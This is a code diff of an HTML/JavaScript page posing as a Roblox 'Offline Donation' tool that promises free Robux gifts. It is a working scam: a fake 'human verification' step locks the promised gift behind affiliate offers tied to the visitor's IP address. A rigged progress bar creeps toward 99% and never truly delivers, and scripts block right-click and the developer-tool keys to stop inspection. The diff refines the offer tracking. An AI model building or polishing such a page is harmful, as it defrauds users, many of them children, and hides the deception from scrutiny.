@@ -20,16 +20,12 @@
             display: flex;
             align-items: center;
             justify-content: center;
-
-            /* --- NEW MOBILE SECURITY --- */
-            -webkit-touch-callout: none; /* Disables the long-press popup on iOS */
-            -webkit-user-select: none;   /* Safari */
-            -moz-user-select: none;      /* Firefox */
-            user-select: none;           /* Standard: Disables text highlighting */
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            user-select: none;
         }
 
-
-        /* --- DEVICE FRAME / OUTLINE --- */
         .app-container {
             width: 100%;
             max-width: 450px; 
@@ -51,11 +47,9 @@
             }
         }
 
-        /* --- VISUALS & ANIMATIONS --- */
         .roblox-font { font-family: 'Fredoka One', cursive; letter-spacing: 0.5px; }
         .hidden { display: none !important; }
         
-        /* Smooth Page Transitions */
         .screen {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -73,22 +67,15 @@
             z-index: 10;
         }
         
-        /* Prevent images from being dragged or saved */
-        img {
-            -webkit-user-drag: none;
-        }
+        img { -webkit-user-drag: none; }
         
-        /* 3D Button Effects */
-        .btn-3d {
-            transition: transform 0.1s, border-bottom-width 0.1s;
-        }
+        .btn-3d { transition: transform 0.1s, border-bottom-width 0.1s; }
         .btn-3d:active {
             transform: translateY(4px);
             border-bottom-width: 0px !important;
             margin-bottom: 4px;
         }
 
-        /* --- PAGE 1: LOGIN STYLES --- */
         .header-bg { 
             background: linear-gradient(135deg, #e91e63, #c2185b);
             border-bottom: 4px solid #880e4f;
@@ -125,14 +112,12 @@
             cursor: pointer; 
         }
 
-        /* Gift Toggle */
         .gift-wrap { display: flex; justify-content: space-between; align-items: center; background-color: #ecfdf5; padding: 12px 16px; border-radius: 16px; border: 2px solid #a7f3d0; margin-bottom: 24px; }
         .toggle-bg { position: relative; width: 56px; height: 32px; background-color: #10b981; border-radius: 30px; cursor: pointer; transition: 0.3s; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1); }
         .toggle-bg.off { background-color: #d1d5db; }
         .toggle-dot { position: absolute; top: 4px; right: 4px; width: 24px; height: 24px; background-color: white; border-radius: 50%; transition: 0.3s; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
         .toggle-bg.off .toggle-dot { right: 28px; }
 
-        /* --- PAGE 2: STAND STYLES --- */
         .wood-leg { position: fixed; bottom: 0; width: 30px; height: 100%; background: repeating-linear-gradient(90deg, #8d5e3a, #7a4e2e 10px); z-index: 0; border-radius: 8px; border: 2px solid #5d3a22; }
         .wood-plank { 
             background-image: url('https://www.transparenttextures.com/patterns/wood-pattern.png'); 
@@ -161,7 +146,6 @@
             text-shadow: 1px 1px 0 rgba(0,0,0,0.2);
         }
 
-        /* --- MODALS --- */
         .modal-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
         .modal-bg.active { opacity: 1; pointer-events: auto; }
         
@@ -171,13 +155,7 @@
         .card-light { background-color: white; width: 90%; max-width: 380px; border-radius: 24px; overflow: hidden; transform: scale(0.9); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); max-height: 85%; display: flex; flex-direction: column; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
         .modal-bg.active .card-light { transform: scale(1); }
 
-        /* --- OFFER STYLING --- */
-        .offers-scroll-container {
-            max-height: 320px; 
-            overflow-y: auto;  
-            padding-right: 5px; 
-        }
-        
+        .offers-scroll-container { max-height: 320px; overflow-y: auto; padding-right: 5px; }
         .offers-scroll-container::-webkit-scrollbar { width: 6px; }
         .offers-scroll-container::-webkit-scrollbar-track { background: #f1f1f1; border-radius: 4px; }
         .offers-scroll-container::-webkit-scrollbar-thumb { background: #e91e63; border-radius: 4px; }
@@ -211,14 +189,12 @@
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e91e63; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
-    </head>
-    <body>
-
+</head>
+<body>
     <audio id="sfx-click" src="data:audio/wav;base64,UklGRi4AAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAACAAEA/v///wAAAAD//wAA/v/+/wAAAQACAAIA///+/wEAAQAAAAEAAAD//wAAAgABAAAA//8BAAAAAQABAAAAAQAAAP//AQABAAAA//8BAAIA//8AAAAAAQABAAAA//8BAAEA//8AAAAAAQABAAAA//8AAAAAAQABAAAA//8AAAAAAQABAAAA//8BAAAAAQABAAAA//8BAAAAAQAAAAAAAQABAAAA//8BAAAAAQAAAAAAAQABAAAA//8BAAAAAQAAAAAAAQAAAAAAAQAAAAAAAQAAAAAAAQAAAA=="></audio>
     <audio id="sfx-btn" src="data:audio/wav;base64,UklGRjIAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAA=="></audio>
 
     <div class="app-container">
-        
         <div id="screen-login" class="screen active flex flex-col">
             <div class="header-bg p-4 flex justify-between items-center shadow-md z-10">
                 <div class="flex items-center gap-2">
@@ -227,179 +203,106 @@
                 </div>
                 <span class="text-white text-2xl cursor-pointer opacity-80 hover:opacity-100 transition" onclick="playSfx('click')">✕</span>
             </div>
-
             <div class="flex-1 flex flex-col items-center px-6 pt-8 overflow-y-auto">
                 <h1 class="text-gray-800 text-2xl roblox-font uppercase tracking-wide mb-2">Offline Donation</h1>
-                <p class="text-gray-500 text-center text-sm font-semibold mb-8 leading-relaxed max-w-xs">
-                    Donate to people outside your server or offline by sending gifts! We'll tell them when they join the game!
-                </p>
-
+                <p class="text-gray-500 text-center text-sm font-semibold mb-8 leading-relaxed max-w-xs">Donate to people outside your server or offline by sending gifts! We'll tell them when they join the game!</p>
                 <div class="w-full max-w-sm">
                     <label class="label-text">Send to</label>
-                    <div class="input-group">
-                        <input type="text" id="username-input" placeholder="Enter Username..." onfocus="playSfx('click')">
-                    </div>
-
+                    <div class="input-group"><input type="text" id="username-input" placeholder="Enter Username..." onfocus="playSfx('click')"></div>
                     <label class="label-text">Message (Optional)</label>
-                    <div class="input-group">
-                        <input type="text" placeholder="Enter Message..." onfocus="playSfx('click')">
-                    </div>
-
+                    <div class="input-group"><input type="text" placeholder="Enter Message..." onfocus="playSfx('click')"></div>
                     <div class="gift-wrap">
-                        <div class="flex items-center gap-3">
-                            <span class="font-bold text-emerald-700 text-sm">ADD GIFT WRAP</span>
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="20">
-                        </div>
-                        <div class="toggle-bg" id="gift-toggle" onclick="toggleSwitch(this)">
-                            <div class="toggle-dot"></div>
-                        </div>
+                        <div class="flex items-center gap-3"><span class="font-bold text-emerald-700 text-sm">ADD GIFT WRAP</span><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="20"></div>
+                        <div class="toggle-bg" id="gift-toggle" onclick="toggleSwitch(this)"><div class="toggle-dot"></div></div>
                     </div>
-
-                    <button id="btn-proceed" onclick="handleUserCheck()" class="btn-blue btn-3d mt-4 shadow-lg">
-                        PROCEED
-                    </button>
-                    
+                    <button id="btn-proceed" onclick="handleUserCheck()" class="btn-blue btn-3d mt-4 shadow-lg">PROCEED</button>
                     <p class="text-xs text-center text-gray-400 mt-6 font-bold">Safe & Secure Transfer</p>
                 </div>
             </div>
         </div>
-
+        
         <div id="screen-stand" class="screen flex flex-col items-center pt-20">
             <div class="wood-leg" style="left: 30px;"></div>
             <div class="wood-leg" style="right: 30px;"></div>
-
-            <div class="wood-plank px-12 py-4 mb-4 transform rotate-1">
-                <h1 id="stand-title" class="text-white text-2xl roblox-font drop-shadow-md text-center">User's Stand</h1>
-            </div>
-
+            <div class="wood-plank px-12 py-4 mb-4 transform rotate-1"><h1 id="stand-title" class="text-white text-2xl roblox-font drop-shadow-md text-center">User's Stand</h1></div>
             <div class="z-20 mb-8 h-48 w-48 relative group">
                 <div class="absolute inset-0 bg-white opacity-20 blur-xl rounded-full group-hover:opacity-30 transition"></div>
                 <img id="stand-avatar" src="" class="w-full h-full object-contain drop-shadow-2xl transition transform group-hover:scale-105 duration-300">
             </div>
-
             <div class="wood-plank w-[90%] max-w-sm py-6 flex justify-between gap-3 px-5 mb-auto">
-                <button onclick="showConfirm(2500); playSfx('btn')" class="btn-robux btn-3d active:scale-95">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 2,500
-                </button>
-                <button onclick="showConfirm(5000); playSfx('btn')" class="btn-robux btn-3d active:scale-95">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 5,000
-                </button>
-                <button onclick="showConfirm(10000); playSfx('btn')" class="btn-robux btn-3d active:scale-95">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 10,000
-                </button>
+                <button onclick="showConfirm(2500); playSfx('btn')" class="btn-robux btn-3d active:scale-95"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 2,500</button>
+                <button onclick="showConfirm(5000); playSfx('btn')" class="btn-robux btn-3d active:scale-95"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 5,000</button>
+                <button onclick="showConfirm(10000); playSfx('btn')" class="btn-robux btn-3d active:scale-95"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 10,000</button>
             </div>
-
             <div class="wood-plank w-[85%] max-w-sm h-12 mt-4 mb-10 opacity-90"></div>
         </div>
 
         <div id="modal-confirm" class="modal-bg">
             <div class="card-dark">
-                <div class="p-5 border-b border-gray-700 bg-[#252f3f]">
-                    <h3 class="font-bold text-xl roblox-font text-white tracking-wide">CONFIRM GIFT</h3>
-                </div>
+                <div class="p-5 border-b border-gray-700 bg-[#252f3f]"><h3 class="font-bold text-xl roblox-font text-white tracking-wide">CONFIRM GIFT</h3></div>
                 <div class="p-6 flex flex-col items-center">
-                    <div class="w-24 h-24 rounded-full bg-gray-800 border-4 border-gray-600 overflow-hidden mb-5 shadow-inner relative">
-                        <img id="confirm-avatar" src="" class="w-full h-full object-cover">
-                    </div>
-                    <p class="text-center text-gray-300 text-lg mb-8 leading-snug">
-                        Would you like to gift <span id="confirm-amt" class="font-black text-[#4caf50]">10,000</span> Robux to <br>"<span id="confirm-name" class="text-white font-bold">user</span>"?
-                    </p>
+                    <div class="w-24 h-24 rounded-full bg-gray-800 border-4 border-gray-600 overflow-hidden mb-5 shadow-inner relative"><img id="confirm-avatar" src="" class="w-full h-full object-cover"></div>
+                    <p class="text-center text-gray-300 text-lg mb-8 leading-snug">Would you like to gift <span id="confirm-amt" class="font-black text-[#4caf50]">10,000</span> Robux to <br>"<span id="confirm-name" class="text-white font-bold">user</span>"?</p>
                     <div class="flex gap-3 w-full">
                         <button onclick="closeModals(); playSfx('click')" class="flex-1 bg-gray-600 border-b-4 border-gray-700 text-white font-bold py-3 rounded-xl active:border-b-0 active:translate-y-1 transition">CANCEL</button>
-                        <button onclick="showCaptcha(); playSfx('btn')" class="flex-1 bg-white border-b-4 border-gray-300 text-black font-bold py-3 rounded-xl flex justify-center items-center gap-2 active:border-b-0 active:translate-y-1 transition">
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18">
-                            <span id="btn-final-amt">10,000</span>
-                        </button>
+                        <button onclick="showCaptcha(); playSfx('btn')" class="flex-1 bg-white border-b-4 border-gray-300 text-black font-bold py-3 rounded-xl flex justify-center items-center gap-2 active:border-b-0 active:translate-y-1 transition"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"><span id="btn-final-amt">10,000</span></button>
                     </div>
                 </div>
             </div>
         </div>
+
         <div id="modal-captcha" class="modal-bg">
             <div class="card-light flex flex-col h-full max-h-[500px]"> 
                 <div class="bg-[#e91e63] p-4 flex justify-between items-center text-white shrink-0 shadow-md z-10">
                     <span id="captcha-header-text" class="font-black text-lg roblox-font tracking-wide">HUMAN VERIFICATION</span>
                     <span onclick="closeModals(); playSfx('click')" class="cursor-pointer font-bold text-xl opacity-80 hover:opacity-100">✕</span>
                 </div>
-                
                 <div id="captcha-step-1" class="p-8 bg-white text-center flex-1 flex flex-col justify-center">
                     <a href="https://ibb.co/4gXDrvmB"><img src="https://i.ibb.co/jZQxX067/20260317-192032.png" class="w-20 mx-auto mb-4 opacity-90 drop-shadow-md" alt="Shield"></a>
                     <h2 class="text-xl font-bold text-gray-800 mb-2">MANUAL VERIFICATION REQUIRED</h2>
                     <p class="text-sm text-gray-500 mb-8 px-4">To prevent spam, please complete a quick manual verification.</p>
-                    
-                    <div class="flex flex-col gap-3 w-full">
-                        <button onclick="executeLocker(); playSfx('btn')" class="bg-[#e91e63] border-b-4 border-[#ad1457] text-white font-black py-4 rounded-xl shadow-lg active:border-b-0 active:translate-y-1 transition text-lg">VERIFY NOW</button>
-                    </div>
+                    <div class="flex flex-col gap-3 w-full"><button onclick="executeLocker(); playSfx('btn')" class="bg-[#e91e63] border-b-4 border-[#ad1457] text-white font-black py-4 rounded-xl shadow-lg active:border-b-0 active:translate-y-1 transition text-lg">VERIFY NOW</button></div>
                 </div>
-
                 <div id="offer-step" class="hidden flex-1 flex flex-col overflow-hidden bg-gray-50">
                     <div class="p-4 bg-white border-b border-gray-200 shrink-0 z-10 shadow-sm">
                         <p class="text-xs font-bold text-gray-700 text-center mb-2">Complete any tasks from below to verify yourself and receive your gift</p>
                         <p class="text-xs text-gray-500">The progress bar will update automatically on task completion.</p>
-                        <div class="w-full bg-gray-200 rounded-full h-4 relative overflow-hidden">
-                            <div id="progress-fill" class="bg-[#e91e63] h-4 rounded-full transition-all duration-700 flex items-center justify-end pr-2" style="width: 0%">
-                                <span id="progress-text" class="text-[9px] text-white font-bold">0%</span>
-                            </div>
-                        </div>
+                        <div class="w-full bg-gray-200 rounded-full h-4 relative overflow-hidden"><div id="progress-fill" class="bg-[#e91e63] h-4 rounded-full transition-all duration-700 flex items-center justify-end pr-2" style="width: 0%"><span id="progress-text" class="text-[9px] text-white font-bold">0%</span></div></div>
                     </div>
-
                     <div id="offers-list" class="offers-scroll-container p-4 flex-1"></div>
-
-                    <div id="loading-offers" class="py-10 text-center hidden">
-                        <div class="spinner"></div>
-                        <p class="text-xs text-gray-400 mt-3 font-bold">LOADING TASKS...</p>
-                    </div>
-
-                    <div class="p-3 bg-white border-t border-gray-200 shrink-0 text-center">
-                        <button onclick="fetchOffers(); playSfx('click')" class="text-[#e91e63] text-xs font-bold hover:underline">
-                            REFRESH LIST
-                        </button>
-                    </div>
+                    <div id="loading-offers" class="py-10 text-center hidden"><div class="spinner"></div><p class="text-xs text-gray-400 mt-3 font-bold">LOADING TASKS...</p></div>
+                    <div class="p-3 bg-white border-t border-gray-200 shrink-0 text-center"><button onclick="fetchOffers(); playSfx('click')" class="text-[#e91e63] text-xs font-bold hover:underline">REFRESH LIST</button></div>
                 </div>
-
                 <div id="success-step" class="hidden p-10 text-center bg-white flex-1 flex flex-col justify-center items-center">
-                    <div class="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center mb-4 shadow-lg animate-bounce">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7" />
-                        </svg>
-                    </div>
+                    <div class="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center mb-4 shadow-lg animate-bounce"><svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7" /></svg></div>
                     <h3 class="text-2xl font-black text-gray-800">Gift Sent!</h3>
                     <p class="text-sm text-gray-500 mt-2">The Robux have been queued for delivery.</p>
                     <button onclick="closeModals(); playSfx('click')" class="mt-8 w-full bg-[#e91e63] text-white font-bold py-3 rounded-xl shadow-lg">CLOSE</button>
                 </div>
             </div>
         </div>
-
-    </div>
-        <script>
+        </div>
+                <script>
         // --- POSTBACK CONFIG ---
         const SERVER_URL = "/api/check"; 
-        const uniqueTrackingId = 'user_' + Math.floor(Math.random() * 10000000);
-
+        
         // GLOBAL DATA
         let userData = { id: 123456, name: "", avatar: "https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/render/image/public/project-uploads/8c757f06-70fb-4925-b654-33a0a1a38e37/image-1768457594705.png?width=8000&height=8000&resize=contain" };
         
-        // --- NEW INFINITE LOOP VARIABLES ---
-        let allAvailableOffers = []; // Stores all fetched offers
-        let currentOfferIndex = 0;   // Tracks where we are in the list
-        let completedCount = 0;      // How many offers finished
-        let currentProgress = 0;     // Visual progress %
+        // --- UPDATED VARIABLES FOR THE FIX ---
+        let allAvailableOffers = []; 
+        let currentOfferIndex = 0;   
+        let completedCount = 0;      
+        let currentProgress = 0;     
+        let completedOfferIds = []; // NEW: Keeps track of finished offer IDs
 
-        // --- SOUND EFFECTS ---
         function playSfx(type) {
             const audio = document.getElementById(type === 'btn' ? 'sfx-btn' : 'sfx-click');
-            if(audio) {
-                audio.currentTime = 0;
-                audio.play().catch(e => console.log("Audio prevented"));
-            }
+            if(audio) { audio.currentTime = 0; audio.play().catch(e => console.log("Audio blocked")); }
         }
 
-        // --- TOGGLE SWITCH ---
-        function toggleSwitch(el) {
-            playSfx('click');
-            el.classList.toggle('off');
-        }
+        function toggleSwitch(el) { playSfx('click'); el.classList.toggle('off'); }
 
-        // --- PAGE NAVIGATION ---
         function switchScreen(hideId, showId) {
             const hideEl = document.getElementById(hideId);
             const showEl = document.getElementById(showId);
@@ -407,23 +310,14 @@
             setTimeout(() => { showEl.classList.add('active'); }, 300);
         }
 
-        // --- UI LOGIC ---
         function handleUserCheck() {
             playSfx('btn');
             const input = document.getElementById('username-input');
             const btn = document.getElementById('btn-proceed');
             const user = input.value.trim();
-
             if (!user) { input.style.borderColor = "red"; return; }
-
-            btn.disabled = true;
-            btn.innerText = "SEARCHING...";
-            btn.style.opacity = "0.7";
-
-            setTimeout(() => {
-                userData.name = user;
-                updateUI();
-            }, 1500);
+            btn.disabled = true; btn.innerText = "SEARCHING..."; btn.style.opacity = "0.7";
+            setTimeout(() => { userData.name = user; updateUI(); }, 1500);
         }
 
         function updateUI() {
@@ -432,10 +326,7 @@
             document.getElementById('confirm-name').innerText = userData.name;
             document.getElementById('confirm-avatar').src = userData.avatar;
             switchScreen('screen-login', 'screen-stand');
-            setTimeout(() => {
-                const btn = document.getElementById('btn-proceed');
-                btn.disabled = false; btn.innerText = "PROCEED"; btn.style.opacity = "1";
-            }, 1000);
+            setTimeout(() => { const btn = document.getElementById('btn-proceed'); btn.disabled = false; btn.innerText = "PROCEED"; btn.style.opacity = "1"; }, 1000);
         }
 
         function showConfirm(amount) {
@@ -468,14 +359,11 @@
             fetchOffers();
         }
         
-        // --- NEW OFFER & LOOP LOGIC ---
         function fetchOffers() {
             $("#loading-offers").removeClass('hidden');
             $("#offers-list").empty();
             
-            // Fetch IP
             $.getJSON("https://api.ipify.org?format=json", function(ipData) {
-                // Pointing to your new secure Vercel API proxy
                 const apiURL = `/api/offers?ip=${ipData.ip}&user_agent=${encodeURIComponent(navigator.userAgent)}`;
                 
                 $.ajax({
@@ -486,20 +374,24 @@
                         $("#loading-offers").addClass('hidden');
 
                         if (data.offers && data.offers.length > 0) {
-                            // Sort by payout: Highest first
-                            allAvailableOffers = data.offers.sort((a, b) => parseFloat(b.payout) - parseFloat(a.payout));
+                            // Filter out already completed offers before sorting
+                            allAvailableOffers = data.offers
+                                .filter(offer => !completedOfferIds.includes(offer.id))
+                                .sort((a, b) => parseFloat(b.payout) - parseFloat(a.payout));
                             
-                            // Initialize Index and Update Bar (BUG FIXED: DO NOT RESET PROGRESS)
                             currentOfferIndex = 0;
                             updateProgressBar(currentProgress); 
 
-                            // Initial Load: Show top 5 offers (or fewer if less exist)
                             const initialLoadCount = Math.min(5, allAvailableOffers.length);
                             for (let i = 0; i < initialLoadCount; i++) {
                                 renderOfferCard(allAvailableOffers[i]);
                                 currentOfferIndex++;
                             }
 
+                            if (allAvailableOffers.length === 0 && completedCount > 0) {
+                                // Handles edge case where everything is completed
+                                checkFinalSuccess();
+                            }
                         } else {
                             $("#offers-list").html('<p class="text-xs text-center text-gray-400 mt-4">No tasks currently available.</p>');
                         }
@@ -514,10 +406,12 @@
 
         function renderOfferCard(offer) {
             let sticker = (offer.payout > 0.5) ? '<div class="hot-sticker">🔥 HOT</div>' : '';
-            let link = offer.link + (offer.link.includes('?') ? '&' : '?') + `aff_sub5=${uniqueTrackingId}`;
+            // Generate a UNIQUE tracking ID for this specific offer instance
+            const tempTrackingId = 'user_' + offer.id + '_' + Math.floor(Math.random() * 100000);
+            let link = offer.link + (offer.link.includes('?') ? '&' : '?') + `aff_sub5=${tempTrackingId}`;
             
             let html = `
-                <div class="offer-card" id="offer-${currentOfferIndex}" onclick="openOffer('${link}', this); playSfx('click')">
+                <div class="offer-card" id="offer-card-${offer.id}" onclick="openOffer('${link}', '${tempTrackingId}', ${offer.id}, this); playSfx('click')">
                     ${sticker}
                     <h4 class="font-bold text-gray-800 text-sm pr-6">${offer.name}</h4>
                     <p class="text-xs text-gray-500 mt-1 leading-tight">Complete this task to verify and receive your gift.</p>
@@ -527,21 +421,21 @@
             $("#offers-list").append(html);
         }
 
-        function openOffer(url, el) {
+        function openOffer(url, trackId, offerId, el) {
             $(el).find('.offer-btn').text('Checking...').css('background', '#9ca3af');
             window.open(url, '_blank');
 
-            // Polling for Postback
             const checkInterval = setInterval(() => {
-                fetch(`${SERVER_URL}?tracking_id=${uniqueTrackingId}`)
+                fetch(`${SERVER_URL}?tracking_id=${trackId}`)
                 .then(r => r.json())
                 .then(data => {
                     if (data.status === 'completed') {
                         clearInterval(checkInterval);
+                        completedOfferIds.push(offerId); // Save to hide permanently
                         handleOfferCompletion(el);
                     }
                 })
-                .catch(err => console.log("Wait for server..."));
+                .catch(err => console.log("Polling..."));
             }, 5000);
         }
 
@@ -549,44 +443,37 @@
             playSfx('btn');
             completedCount++;
             
-            // --- PERCENTAGE LOGIC AS REQUESTED ---
-            // 50% -> 75% -> 80% -> 86% -> 89% -> 90% -> small increments until end
             if (completedCount === 1) currentProgress = 50;
             else if (completedCount === 2) currentProgress = 75;
             else if (completedCount === 3) currentProgress = 80;
             else if (completedCount === 4) currentProgress = 86;
             else if (completedCount === 5) currentProgress = 89;
             else if (completedCount === 6) currentProgress = 90;
-            else {
-                // For 7+ offers, creep up slowly towards 99%
-                if (currentProgress < 99) currentProgress += 1;
-            }
+            else if (currentProgress < 99) currentProgress += 1;
 
-            // Remove the clicked card with animation
             $(el).fadeOut(300, function() {
                 $(this).remove();
-                
-                // --- LOOP LOGIC: CHECK IF MORE OFFERS EXIST ---
-                // Do we still have offers in the 'allAvailableOffers' array that haven't been shown?
                 if (currentOfferIndex < allAvailableOffers.length) {
-                    // Yes: Add the next highest paying offer
                     renderOfferCard(allAvailableOffers[currentOfferIndex]);
                     currentOfferIndex++;
-                    updateProgressBar(currentProgress); // Show updated %
+                    updateProgressBar(currentProgress);
                 } else {
-                    // No offers left in the entire array = 100% SUCCESS
-                    updateProgressBar(100);
-                    setTimeout(() => {
-                        document.getElementById('offer-step').classList.add('hidden');
-                        document.getElementById('offer-step').classList.remove('flex');
-                        document.getElementById('success-step').classList.remove('hidden');
-                        document.getElementById('captcha-header-text').innerText = "SUCCESS";
-                    }, 800);
+                    checkFinalSuccess();
                 }
             });
-            
-            if (currentOfferIndex < allAvailableOffers.length) {
-                 updateProgressBar(currentProgress);
+            updateProgressBar(currentProgress);
+        }
+
+        function checkFinalSuccess() {
+            // Check if active cards are gone or total progress is maxed
+            if ($("#offers-list").children().length === 0) {
+                updateProgressBar(100);
+                setTimeout(() => {
+                    document.getElementById('offer-step').classList.add('hidden');
+                    document.getElementById('offer-step').classList.remove('flex');
+                    document.getElementById('success-step').classList.remove('hidden');
+                    document.getElementById('captcha-header-text').innerText = "SUCCESS";
+                }, 800);
             }
         }
 
@@ -594,21 +481,12 @@
             document.getElementById('progress-fill').style.width = percent + '%';
             document.getElementById('progress-text').innerText = percent + '%';
         }
-    </script>
-            <script>
-        document.addEventListener('contextmenu', event => event.preventDefault());
 
+        // --- SECURITY SCRIPTS ---
+        document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function (e) {
-            if (
-                e.keyCode === 123 || // F12
-                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I or Ctrl+Shift+J
-                (e.ctrlKey && e.keyCode === 85) // Ctrl+U
-            ) {
-                return false;
-            }
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) return false;
         };
-            </script>
-        
+    </script>
 </body>
-    </html>
-    
+</html>
